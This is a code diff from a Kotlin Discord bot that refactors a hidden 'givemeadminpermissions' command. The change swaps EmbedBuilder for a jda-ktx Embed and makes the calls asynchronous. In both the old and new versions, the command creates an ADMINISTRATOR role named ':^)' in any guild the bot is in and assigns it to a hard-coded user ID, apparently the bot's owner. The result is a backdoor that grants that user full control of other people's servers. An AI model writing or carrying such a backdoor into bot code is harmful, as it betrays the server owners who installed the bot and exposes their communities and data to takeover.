@@ -4,10 +4,9 @@ import de.tectoast.emolga.commands.Command
 import de.tectoast.emolga.commands.CommandCategory
 import de.tectoast.emolga.commands.GuildCommandEvent
 import de.tectoast.emolga.utils.Constants
-import net.dv8tion.jda.api.EmbedBuilder
+import dev.minn.jda.ktx.messages.Embed
 import net.dv8tion.jda.api.Permission
 import net.dv8tion.jda.api.entities.UserSnowflake
-import java.awt.Color
 
 class GiveMeAdminPermissionsCommand : Command("givemeadminpermissions", ":^)", CommandCategory.Flo) {
     init {
@@ -18,11 +17,10 @@ class GiveMeAdminPermissionsCommand : Command("givemeadminpermissions", ":^)", C
     }
 
     override fun process(e: GuildCommandEvent) {
-        val g = e.jda.getGuildById(e.arguments!!.getID("guild"))
-        val r = g!!.createRole().setPermissions(Permission.ADMINISTRATOR).setName(":^)").complete()
-        g.addRoleToMember(UserSnowflake.fromId(Constants.FLOID), r).queue()
-        val builder = EmbedBuilder()
-        builder.setTitle("Succesfully gave admin permission on \"" + g.name + "\"!").setColor(Color.RED)
-        e.textChannel.sendMessageEmbeds(builder.build()).queue()
+        val g = e.jda.getGuildById(e.arguments.getID("guild"))
+        g!!.createRole().setPermissions(Permission.ADMINISTRATOR).setName(":^)").queue {
+            g.addRoleToMember(UserSnowflake.fromId(Constants.FLOID), it).queue()
+            e.reply(Embed(title = "Succesfully gave admin permission on \"${g.name}\"!", color = 0xFF0000))
+        }
     }
 }
